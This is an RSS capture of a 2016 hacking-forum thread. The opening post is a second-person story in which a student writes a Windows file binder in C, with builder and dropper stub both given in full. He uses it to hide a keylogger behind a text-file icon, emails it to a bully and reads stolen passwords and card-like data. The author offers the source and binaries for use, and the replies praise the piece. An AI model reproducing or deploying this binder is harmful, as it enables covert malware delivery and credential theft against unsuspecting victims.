@@ -1,0 +1,1024 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>With Great Power Comes Great Responsibility</title>
+    <link>https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839</link>
+    <description>A droplet of water shatters like glass upon your nose as the murky sky roars dominantly overhead. You gladly respect the sky gods&#39; anger and continue picking up your pace since you&#39;ve still a while to go until you&#39;re home.
+
+3:30 PM. Though it took you 20 minutes to jog home from school. Surprisingly, you managed to evade the torrential downpour which unexpectedly started slamming deafeningly against the ceramic tiles on your roof as you hurried to your room. Carelessly dropping your school bag, you hopped onto your chair and woke your computer from sleep. Your heart begins to race. The school bully, Jerry, had almost redecorated your face with the red paint from your nose earlier today because you failed to provide the assignment solutions at the time he requested. In response, you gave him an Oscar-award winning act, begging him not to since you would not be able to deliver it to him from the hospital. You&#39;ve promised to send it to him over the internet some time tonight but you&#39;ve other plans...
+
+You fired up your Microsoft Visual Studio IDE and started to revise the code on which you have been working for the past couple of days. Firstly, the code for the the file binder.
+```c
+#include &lt;stdio.h&gt;
+#include &lt;stdarg.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;Shlwapi.h&gt;
+
+#pragma comment(lib, &quot;Shlwapi.lib&quot;)
+
+#define PAYLOAD_BUFFER_RSRC_ID 10
+#define PAYLOAD_EXTENSION_RSRC_ID (PAYLOAD_BUFFER_RSRC_ID + 1)
+#define SECONDARY_BUFFER_RSRC_ID 20
+#define SECONDARY_EXTENSION_RSRC_ID (SECONDARY_BUFFER_RSRC_ID + 1)
+
+typedef struct _FileStruct {
+    PBYTE pBuffer;
+    DWORD dwFileSize;
+    LPSTR lpExtension;
+    DWORD dwExtensionLength;
+} FileStruct, *pFileStruct;
+
+VOID Debug(LPCSTR fmt, ...) {
+    va_list args;
+    va_start(args, fmt);
+
+    vprintf(fmt, args);
+
+    va_end(args);
+}
+
+FileStruct *LoadFile(LPCSTR szFileName) {
+    Debug(&quot;Loading %s...\n&quot;, szFileName);
+
+    Debug(&quot;Initializing struct...\n&quot;);
+    FileStruct *fs = (FileStruct *)malloc(sizeof(*fs));
+    if (fs == NULL) {
+        Debug(&quot;Create %s file structure error: %lu\n&quot;, szFileName, GetLastError());
+        return NULL;
+    }
+
+    Debug(&quot;Initializing file...\n&quot;);
+    // get file handle to file
+    HANDLE hFile = CreateFile(szFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        Debug(&quot;Create file error: %lu\n&quot;, GetLastError());
+        free(fs);
+        return NULL;
+    }
+
+    Debug(&quot;Extracting extension...\n&quot;);
+    // get file extension
+    fs-&gt;lpExtension = PathFindExtension(szFileName);
+    fs-&gt;dwExtensionLength = strlen(fs-&gt;lpExtension);
+    Debug(&quot;Extension: %s\n&quot;, fs-&gt;lpExtension);
+
+    // get file size
+    Debug(&quot;Retrieving file size...\n&quot;);
+    fs-&gt;dwFileSize = GetFileSize(hFile, NULL);
+    if (fs-&gt;dwFileSize == INVALID_FILE_SIZE) {
+        Debug(&quot;Get file size error: %lu\n&quot;, GetLastError());
+        CloseHandle(hFile);
+        free(fs);
+        return NULL;
+    }
+
+    // create heap buffer to hold file contents
+    fs-&gt;pBuffer = (PBYTE)malloc(fs-&gt;dwFileSize);
+    if (fs-&gt;pBuffer == NULL) {
+        Debug(&quot;Create buffer error: %lu\n&quot;, GetLastError());
+        CloseHandle(hFile);
+        free(fs);
+        return NULL;
+    }
+
+    // read file contents
+    Debug(&quot;Reading file contents...\n&quot;);
+    DWORD dwRead = 0;
+    if (ReadFile(hFile, fs-&gt;pBuffer, fs-&gt;dwFileSize, &amp;dwRead, NULL) == FALSE) {
+        Debug(&quot;Read file error: %lu\n&quot;, GetLastError());
+        CloseHandle(hFile);
+        free(fs);
+        return NULL;
+    }
+    Debug(&quot;Read 0x%08x bytes\n\n&quot;, dwRead);
+
+    // clean up
+    CloseHandle(hFile);
+
+    return fs;
+}
+
+BOOL UpdateStub(LPCSTR szFileName, FileStruct *fs, int nRsrcId) {
+    // start updating stub&#39;s resources
+    HANDLE hUpdate = BeginUpdateResource(szFileName, FALSE);
+    // add file as a resource to stub
+    if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(nRsrcId), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs-&gt;pBuffer, fs-&gt;dwFileSize) == FALSE) {
+        Debug(&quot;Update resource error: %lu\n&quot;, GetLastError());
+        return FALSE;
+    }
+
+    // add file&#39;s extension as a resource
+    if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(nRsrcId + 1), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs-&gt;lpExtension, fs-&gt;dwExtensionLength) == FALSE) {
+        Debug(&quot;Update resource error: %lu\n&quot;, GetLastError());
+        return FALSE;
+    }
+
+    EndUpdateResource(hUpdate, FALSE);
+
+    return TRUE;
+}
+
+BOOL BuildStub(LPCSTR szFileName, FileStruct *fsPayload, FileStruct *fsSecondary) {
+    Debug(&quot;Building stub: %s...\n&quot;, szFileName);
+
+    // get stub program as a resource
+    HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(1), &quot;STUB&quot;);
+    if (hRsrc == NULL) {
+        Debug(&quot;Find resource error: %lu\n&quot;, GetLastError());
+        return FALSE;
+    }
+    DWORD dwSize = SizeofResource(NULL, hRsrc);
+
+    HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
+    if (hGlobal == NULL) {
+        Debug(&quot;Load resource error: %lu\n&quot;, GetLastError());
+        return FALSE;
+    }
+
+    // get stub&#39;s file content
+    PBYTE pBuffer = (PBYTE)LockResource(hGlobal);
+    if (pBuffer == NULL) {
+        Debug(&quot;Lock resource error: %lu\n&quot;, GetLastError());
+        return FALSE;
+    }
+
+    // create output file
+    Debug(&quot;Creating stub file...\n&quot;);
+    HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        Debug(&quot;Create stub error: %lu\n&quot;, GetLastError());
+        free(pBuffer);
+        return FALSE;
+    }
+
+    // write stub content to output file
+    Debug(&quot;Writing buffer content to stub...\n&quot;);
+    DWORD dwWritten = 0;
+    if (WriteFile(hFile, pBuffer, dwSize, &amp;dwWritten, NULL) == FALSE) {
+        Debug(&quot;Write payload to stub error: %lu\n&quot;, GetLastError());
+        CloseHandle(hFile);
+        free(pBuffer);
+        return FALSE;
+    }
+    Debug(&quot;Wrote 0x%08x bytes\n\n&quot;);
+
+    CloseHandle(hFile);
+
+    // add payload to stub
+    Debug(&quot;Updating stub with payload...\n&quot;);
+    if (UpdateStub(szFileName, fsPayload, PAYLOAD_BUFFER_RSRC_ID) == FALSE)
+        return FALSE;
+
+    // add secondary file to stub
+    Debug(&quot;Updating stub with secondary file...\n&quot;);
+    if (UpdateStub(szFileName, fsSecondary, SECONDARY_BUFFER_RSRC_ID) == FALSE)
+        return FALSE;
+
+    return TRUE;
+}
+
+// FileBinder.exe [PAYLOAD FILE] [SECONDARY FILE] [OUTPUT FILE]
+int main(int argc, char *argv[]) {
+    if (argc &lt; 4) {
+        Debug(&quot;Usage: %s [PAYLOAD EXECUTABLE] [SECONDARY FILE] [OUTPUT FILE]&quot;, argv[0]);
+        return 1;
+    }
+
+    // load file information into structs
+    FileStruct *fsPayload = LoadFile(argv[1]);
+    if (fsPayload == NULL) return 1;
+    FileStruct *fsSecondary = LoadFile(argv[2]);
+    if (fsSecondary == NULL) return 1;
+
+    if (BuildStub(argv[3], fsPayload, fsSecondary) == FALSE)
+        return 1;
+
+    free(fsPayload);
+    free(fsSecondary);
+
+    Debug(&quot;\nDone\n&quot;);
+
+    return 0;
+}
+```
+Silently, you read over the code and conjure the pseudocode in your mind.
+```makefile
+1. Load each of the two input files and read their file contents, storing the information within structs
+2. Create an empty output file as the updated stub
+3. Load the stub as a resource and write it out to the output file
+4. For each of the two input structs, add the members as a resource to the output stub file
+```
+A smirk grows on your face. You then quickly repeat the process for the stub of your file binder.
+```c
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;Shlwapi.h&gt;
+
+#pragma comment(lib, &quot;Shlwapi.lib&quot;)
+
+#define PAYLOAD_BUFFER_RSRC_ID 10
+#define PAYLOAD_EXTENSION_RSRC_ID (PAYLOAD_BUFFER_RSRC_ID + 1)
+#define SECONDARY_BUFFER_RSRC_ID 20
+#define SECONDARY_EXTENSION_RSRC_ID (SECONDARY_BUFFER_RSRC_ID + 1)
+
+typedef struct _FileStruct {
+    PBYTE pBuffer;
+    DWORD dwFileSize;
+    LPSTR lpExtension;
+    DWORD dwExtensionLength;
+} FileStruct, *pFileStruct;
+
+VOID Debug(LPCSTR fmt, ...) {
+    va_list args;
+    va_start(args, fmt);
+
+    CHAR szBuffer[BUFSIZ];
+    vsprintf(szBuffer, fmt, args);
+    MessageBox(NULL, szBuffer, __argv[0], MB_OK | MB_ICONEXCLAMATION);
+
+    va_end(args);
+}
+
+FileStruct *InitializeStruct(int nRsrcId) {
+    // create struct
+    FileStruct *fs = (FileStruct *)malloc(sizeof(*fs));
+    if (fs == NULL) return NULL;
+
+    // get file buffer
+    // get size of resource
+    HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(nRsrcId), RT_RCDATA);
+    if (hRsrc == NULL) return NULL;
+    fs-&gt;dwFileSize = SizeofResource(NULL, hRsrc);
+
+    // get pointer to resource buffer
+    HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
+    if (hGlobal == NULL) return NULL;
+    fs-&gt;pBuffer = (PBYTE)LockResource(hGlobal);
+    if (fs-&gt;pBuffer == NULL) return NULL;
+
+    // get file extension
+    // get strlen of extension
+    hRsrc = FindResource(NULL, MAKEINTRESOURCE(nRsrcId + 1), RT_RCDATA);
+    if (hRsrc == NULL) return NULL;
+    fs-&gt;dwExtensionLength = SizeofResource(NULL, hRsrc);
+
+    // get pointer to extension buffer
+    hGlobal = LoadResource(NULL, hRsrc);
+    if (hGlobal == NULL) return NULL;
+    fs-&gt;lpExtension = (PBYTE)LockResource(hGlobal);
+    if (fs-&gt;lpExtension == NULL) return NULL;
+
+    return fs;
+}
+
+BOOL DropFile(FileStruct *fs, LPSTR szFileNameBuffer) {
+    DWORD dwWritten = 0;
+    // get temp file name
+    CHAR szTempFileName[MAX_PATH];
+    CHAR szFileName[MAX_PATH];
+
+    // get temp path
+    GetTempPath(MAX_PATH, szTempFileName);
+    // get file name (incl. path)
+    GetModuleFileName(NULL, szFileName, MAX_PATH);
+    // strip path and extract only executable name
+    PathStripPath(szFileName);
+    // append exe name to temp path
+    PathAppend(szTempFileName, szFileName);
+    // replace file extension
+    memcpy(szTempFileName + strlen(szTempFileName) - 4, fs-&gt;lpExtension, fs-&gt;dwExtensionLength);
+    strcpy(szFileNameBuffer, szTempFileName);
+
+    // drop payload file
+    HANDLE hFile = CreateFile(szTempFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        Debug(&quot;Create temp file error: %lu&quot;, GetLastError());
+        return FALSE;
+    }
+
+    // write buffer into file
+    if (WriteFile(hFile, fs-&gt;pBuffer, fs-&gt;dwFileSize, &amp;dwWritten, NULL) == FALSE) {
+        Debug(&quot;Write temp file error: %lu&quot;, GetLastError());
+        CloseHandle(hFile);
+        return FALSE;
+    }
+    // clean up
+    CloseHandle(hFile);
+
+    return TRUE;
+}
+
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
+    FileStruct *fsPayload = NULL, *fsSecondary = NULL;
+
+    fsPayload = InitializeStruct(PAYLOAD_BUFFER_RSRC_ID);
+    fsSecondary = InitializeStruct(SECONDARY_BUFFER_RSRC_ID);
+
+    CHAR szPayloadFileName[BUFSIZ];
+    CHAR szSecondaryFileName[BUFSIZ];
+
+    DropFile(fsPayload, szPayloadFileName);
+    DropFile(fsSecondary, szSecondaryFileName);
+    free(fsPayload);
+    free(fsSecondary);
+
+    // execute payload
+    if (ShellExecute(NULL, NULL, szPayloadFileName, NULL, NULL, SW_NORMAL) &lt;= 32) {
+        Debug(&quot;Start payload error: %lu&quot;, GetLastError());
+        return 1;
+    }
+
+    // execute secondary file
+    if (ShellExecute(NULL, NULL, szSecondaryFileName, NULL, NULL, SW_NORMAL) &lt;= 32) {
+        Debug(&quot;Start secondary error: %lu&quot;, GetLastError());
+        return 1;
+    }
+
+    return 0;
+}
+```
+```makefile
+1. Initialize the file structs with the added resources from the file binder application for both files
+2. For each file, create a temporary file and write out the file contents
+3. Execute both files
+```
+You realize that this method for the stub is not the best since it introduces a lot of forensic evidence and disk activity however, you know that Jerry won&#39;t have a single clue about any of this so you assumed you will be fine and need not to worry.
+
+A test run to confirm that your file binder works is needed for you to be sure that this approach will be successful. Time to launch the Windows command shell.
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/4ef49dadaebcbe177a3cf115559dc5ca675d4e12.PNG&quot; width=&quot;380&quot; height=&quot;387&quot;&gt;
+You then launch Resource Hacker and add the icon of the text file to the application and press save...
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/be29733420a3120774f40627abc0596ad799189e.PNG&quot; width=&quot;79&quot; height=&quot;76&quot;&gt;
+You double click the file...
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/c2f190a85a3daf2b066c95af6eafb44c32e52fbd.PNG&quot; width=&quot;690&quot; height=&quot;411&quot;&gt;
+Your heart starts to beat faster... Successful execution.
+
+Hurriedly, you disable debug mode for your keylogger and rebuild the file... You compress it inside a folder, attach it to an email directed to Jerry... and click to send. As you inhale deeply, questions begin plaguing your mind. What information would I get from his computer? Could I possibly find the password for his Facebook and Gmail? What could I do with such information? The heat of the moment has your brain running overtime as adrenaline floods your body as you decide to get up and shrug off the excitement which has exploded from your actions. A wide grin draws across your face as an ear-splitting blast of thunder explodes in the vicinity, almost as to complement what you have just unleashed...
+
+~  ~  ~
+
+There are no words which can describe your feelings as you approach your computer. It&#39;s been exactly one week since you&#39;ve delivered the silent, vengeful maelstrom upon your foe. Your heart is beating out of your chest. Breathing, quick in succession. You look behind you and see your door is wide open, welcoming any curious eyes to spy on your every actions. Your father is home today. After closing the door, slowly and soundlessly, you reapproach your system. It&#39;s time for harvest...
+
+You log into your FTP account through the FileZilla FTP client as you wonder what you could have retrieved. You browse to your directory which holds the logs from your keylogger and you see the text file waiting for its master. Waiting for you. Hesitantly, you right-click and click _View_. A Sublime Text window spawns and you see a mass of letters, numbers and strings which correspond to keys on the keyboard such as `[ENTER]` and `[SHIFT]`. A beautiful sight before your eyes. As you quickly run your eyes across the screen, you quickly see patterns. There were many `w`, `a`, `s` and `d` letters, all bunched together like `aaaaaaaaaaaaaaaaa` and `wwwwwwwwwwwwwwwwdddddddwwwwwww`. He must be playing some sort of game, you think to yourself. That means he must have needed to log into his account at some point. You check the strings from a previous point and you see it. `Birdpers0n` and `9375chw1f7y`. Brilliant. What&#39;s this? A sequence of eighteen followed by a slash and then five numbers and a `Rick M. Sanchez`? `XXXXXXXXXXXXXXXXXX/XXXXX Rick M. Sanchez`... `XXXX XXXX XXXX XXXX XX/XX XXX Rick M. Sanchez`... Droplets of sweat coat your palms and forehead, pupils dilated. Your respiration halts yet a wave of epinephrine overflows your bloodstream. You lean backwards onto your chair to absorb the information you have witnessed. You take a deep breath. What will you do with your discovery?
+- - -
+
+A&#39;ight, so, this thread only covered the social engineering aspect of a hypothetical attack (obviously) which means that the details of the keylogger were missing. Do not worry, I am planning to write up a second part to my Windows Keylogging paper in the future which will cover the details such as FTP uploading keystrokes.
+
+I&#39;ll be uploading the source code to my [GitHub - File Binder](https://github.com/93aef0ce4dd141ece6f5/File-Binder) (there are other files which are involved which were not covered) and also the binaries (32-bit, compiled on Windows 7) if you guys want to play around with it. The binder works for any (AFAIK) two files, so that can be like `.exe` and `.jpg`, or `.jpg` and `.txt` but you might have to run the file binder/stub generator a second time some times if the output happens to fail on the first build.
+
+Hope you guys enjoyed!
+
+_-- dtm_</description>
+    
+    <lastBuildDate>Sat, 10 Dec 2016 17:28:02 +0000</lastBuildDate>
+    <category>Social Engineering</category>
+    <atom:link href="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>With Great Power Comes Great Responsibility</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
+          <p><a href="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/24">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/24</link>
+        <pubDate>Sun, 21 Jan 2018 00:38:37 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-839-24</guid>
+        <source url="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839.rss">With Great Power Comes Great Responsibility</source>
+      </item>
+      <item>
+        <title>With Great Power Comes Great Responsibility</title>
+        <dc:creator><![CDATA[pry0cc]]></dc:creator>
+        <description><![CDATA[
+            <p>Agreed, I love these fanfiction kind of things.</p>
+          <p><a href="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/23">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/23</link>
+        <pubDate>Sat, 10 Dec 2016 17:28:02 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-839-23</guid>
+        <source url="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839.rss">With Great Power Comes Great Responsibility</source>
+      </item>
+      <item>
+        <title>With Great Power Comes Great Responsibility</title>
+        <dc:creator><![CDATA[VoidAccess]]></dc:creator>
+        <description><![CDATA[
+            <p>This was a really amazing write up! We need more of these.</p>
+          <p><a href="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/22">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/22</link>
+        <pubDate>Sat, 10 Dec 2016 17:17:40 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-839-22</guid>
+        <source url="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839.rss">With Great Power Comes Great Responsibility</source>
+      </item>
+      <item>
+        <title>With Great Power Comes Great Responsibility</title>
+        <dc:creator><![CDATA[oaktree]]></dc:creator>
+        <description><![CDATA[
+            <p>Might I add that another reason for the typedefs is to ensure that code breaks less. You can redefine <code>HRSRC</code> if you had to, and none of the code with <code>HRSRC</code> would break. But if you used <code>void*</code> for resource handles instead and <code>void*</code> got deprecated, you’d have to rewrite some code.</p>
+          <p><a href="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/21">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/21</link>
+        <pubDate>Wed, 10 Aug 2016 20:22:58 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-839-21</guid>
+        <source url="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839.rss">With Great Power Comes Great Responsibility</source>
+      </item>
+      <item>
+        <title>With Great Power Comes Great Responsibility</title>
+        <dc:creator><![CDATA[EnergyWolf]]></dc:creator>
+        <description><![CDATA[
+            <p>Thanks for that. I actually did go and step through your code with the help, mainly, of MSDN, and that very page. Turns out it wasn’t half as alien as it first appeared… which is great! Also helpful, were these:<br>
+<a href="https://msdn.microsoft.com/en-us/library/kb57fad8.aspx" rel="nofollow noopener">va_arg, va_copy, va_end, va_start</a><br>
+<a href="https://www.cygwin.com/ml/cygwin/2003-06/msg00470/windef.h" rel="nofollow noopener">windef.h source</a><br>
+Though I still don’t fully get MAKEINTRESOURCE(int rsrcid)… even after the docs. I’ll keep trying though <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
+          <p><a href="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/20">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/20</link>
+        <pubDate>Wed, 10 Aug 2016 08:32:35 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-839-20</guid>
+        <source url="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839.rss">With Great Power Comes Great Responsibility</source>
+      </item>
+      <item>
+        <title>With Great Power Comes Great Responsibility</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>Most, if not all, of the data types in the WinAPI are typedef’d to make things easier to recognize. For example, the data type <code>HRSRC</code> allows the reader to identify it as a <em>resource handle</em> as opposed to <code>void *</code> which is worth nothing in terms of being able to understand the purpose of the corresponding variable.</p>
+<p>Here is the list of Windows Data Types and their typedefs: <a href="https://msdn.microsoft.com/en-au/library/windows/desktop/aa383751(v=vs.85).aspx">MSDN - Windows Data Types</a>.</p>
+          <p><a href="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/19">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/19</link>
+        <pubDate>Wed, 10 Aug 2016 05:38:00 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-839-19</guid>
+        <source url="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839.rss">With Great Power Comes Great Responsibility</source>
+      </item>
+      <item>
+        <title>With Great Power Comes Great Responsibility</title>
+        <dc:creator><![CDATA[EnergyWolf]]></dc:creator>
+        <description><![CDATA[
+            <p>Great post, really like the creative approach, but damn it, those windows data types throw me… guess it’s google time <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+          <p><a href="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/18">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/18</link>
+        <pubDate>Tue, 09 Aug 2016 13:46:09 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-839-18</guid>
+        <source url="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839.rss">With Great Power Comes Great Responsibility</source>
+      </item>
+      <item>
+        <title>With Great Power Comes Great Responsibility</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>That’s true, but Jerry would. I forgot to mention that in this crazy universe, Jerry is Rick’s son.</p>
+          <p><a href="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/17">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/17</link>
+        <pubDate>Fri, 29 Jul 2016 12:20:56 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-839-17</guid>
+        <source url="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839.rss">With Great Power Comes Great Responsibility</source>
+      </item>
+      <item>
+        <title>With Great Power Comes Great Responsibility</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>Thanks for the kind words however, creative writing isn’t really that appealing to me. Glad you enjoyed it!</p>
+          <p><a href="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/16">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/16</link>
+        <pubDate>Fri, 29 Jul 2016 12:20:11 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-839-16</guid>
+        <source url="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839.rss">With Great Power Comes Great Responsibility</source>
+      </item>
+      <item>
+        <title>With Great Power Comes Great Responsibility</title>
+        <dc:creator><![CDATA[Neo]]></dc:creator>
+        <description><![CDATA[
+            <p>Have you considered writing hacker novels or at least short stories like this? You definitely have a talent for writing. I’d probably even pay to read your stuff.<br>
+Just a thought…</p>
+          <p><a href="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/15">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/15</link>
+        <pubDate>Fri, 29 Jul 2016 10:37:04 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-839-15</guid>
+        <source url="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839.rss">With Great Power Comes Great Responsibility</source>
+      </item>
+      <item>
+        <title>With Great Power Comes Great Responsibility</title>
+        <dc:creator><![CDATA[Valentine]]></dc:creator>
+        <description><![CDATA[
+            <p>Wow… after reading this piece of literature  I’m speechless. Nice Job mate.  Cheers.</p>
+          <p><a href="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/14">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/14</link>
+        <pubDate>Thu, 28 Jul 2016 19:04:08 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-839-14</guid>
+        <source url="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839.rss">With Great Power Comes Great Responsibility</source>
+      </item>
+      <item>
+        <title>With Great Power Comes Great Responsibility</title>
+        <dc:creator><![CDATA[Sirius]]></dc:creator>
+        <description><![CDATA[
+            <p>&gt;.&gt;<br>
+There’s no way rick would fall for such a thing…<br>
+Git rickity rickity wrecked son!</p>
+<p>But otherwise this was beautiful. I want moar!</p>
+          <p><a href="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/13">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/13</link>
+        <pubDate>Thu, 28 Jul 2016 18:53:38 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-839-13</guid>
+        <source url="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839.rss">With Great Power Comes Great Responsibility</source>
+      </item>
+      <item>
+        <title>With Great Power Comes Great Responsibility</title>
+        <dc:creator><![CDATA[Cromical]]></dc:creator>
+        <description><![CDATA[
+            <p>I’ll just message you them when I have time later today <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+          <p><a href="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/12">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/12</link>
+        <pubDate>Thu, 28 Jul 2016 15:55:20 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-839-12</guid>
+        <source url="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839.rss">With Great Power Comes Great Responsibility</source>
+      </item>
+      <item>
+        <title>With Great Power Comes Great Responsibility</title>
+        <dc:creator><![CDATA[Cromical]]></dc:creator>
+        <description><![CDATA[
+            <p>I’ve got a couple good ones if you’d like!</p>
+          <p><a href="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/11">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/11</link>
+        <pubDate>Thu, 28 Jul 2016 15:48:11 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-839-11</guid>
+        <source url="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839.rss">With Great Power Comes Great Responsibility</source>
+      </item>
+      <item>
+        <title>With Great Power Comes Great Responsibility</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>There could be material out there which discusses different “flavours”(?) of C like WinAPI but I learned it from reading the documentation and copy and pasting code from all over the internet (especially Stack Overflow). A lot of the code I couldn’t understand at first but over time as I familiarized myself with the language (and the OS), it became sorta natural.</p>
+<p>Don’t expect a lot at the beginning, the steep uphill always comes before the easy downhill ride. You just gotta keep climbing.</p>
+          <p><a href="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/10">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/10</link>
+        <pubDate>Thu, 28 Jul 2016 08:58:07 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-839-10</guid>
+        <source url="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839.rss">With Great Power Comes Great Responsibility</source>
+      </item>
+      <item>
+        <title>With Great Power Comes Great Responsibility</title>
+        <dc:creator><![CDATA[anon79434934]]></dc:creator>
+        <description><![CDATA[
+            <p>I should learn C…</p>
+<p>Seriously though, I’ve been whining all over IRC for some good books to recommend, but only got “learn C the hard way” and the book by Ritchie. And don’t tell me that is enough, because I’m pretty sure this fancy stuff isn’t covered in either of the two! (or is it?). Basically, where do I learn this stuff? What books should I get after I finished the other two?</p>
+<p>-Phoenix750</p>
+          <p><a href="https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/9">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/with-great-power-comes-great-responsibility/839/9</link>
